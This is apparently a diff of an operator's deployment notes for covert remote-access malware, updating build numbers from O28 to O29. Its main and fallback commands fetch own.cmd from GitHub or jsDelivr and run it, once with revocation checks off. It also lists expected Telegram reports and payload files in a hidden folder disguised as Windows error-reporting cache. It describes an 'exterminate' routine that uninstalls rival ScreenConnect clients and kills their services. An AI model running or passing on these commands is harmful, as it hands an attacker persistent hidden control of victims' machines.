@@ -1,26 +1,21 @@
-UNIVERSAL DEPLOY  (O28: identity loader %%L fix + L7 correct WOW hive + hardened
-exterminate that actually uninstalls 32-bit SC products + force dir nuke +
-M18 + T10 build visibility). THE ONLY COMMAND TO KEEP:
+UNIVERSAL DEPLOY  (O29: SC-compatible install ladder - /fa first, /i last resort
+only when unregistered; L8 registered test fixed; Guest MSI URL unified; pkg.msi
+cache wired into mon heal; identity %%L + WOW hive from O28):
 
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o28" && call C:\WINDOWS\TEMP\own.cmd
+  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o29" && call C:\WINDOWS\TEMP\own.cmd
 
 Rescue:
 
-  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o28" && call C:\WINDOWS\TEMP\own.cmd
+  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o29" && call C:\WINDOWS\TEMP\own.cmd
 
-Expect in TG after ~3-4 min:
-  Source build: O28
-  Payload builds: MON=M18 | SEC=S6 | TGR=T10 | LIB=L7
-  identity_A=\Microsoft\Windows\...   (REAL path, NEVER %V)
-  exterminate_engine_L7_begin
-  hive_scan ...WOW6432Node\Microsoft\Windows\...
-  product_msiexec [ScreenConnect Client (FOREIGN)] exit=0
-  dir_removed ...
-  exterminate svc=N proc=N dir=N product=N rmm=N fail=0
+Expect TG:
+  Source build: O29
+  Payload builds: MON=M19 | SEC=S6 | TGR=T10 | LIB=L8
+  identity_A=\Microsoft\Windows\...   (real path)
+  exterminate ... product=N dir=N
   Foreign SC folders left: 0
+  NO msi_reinstall_ line (blind REINSTALL removed - it wiped ALT)
 
-On-machine verify:
-  findstr /C:"BUILD" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.cmd" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\tg_report.ps1"
-  (expect M18 / L7 / T10)
-  type "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\exterminate.log"
-  type "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\identity.cfg"
+Verify:
+  findstr /C:"BUILD" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.cmd" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1"
+  (expect M19 / L8)
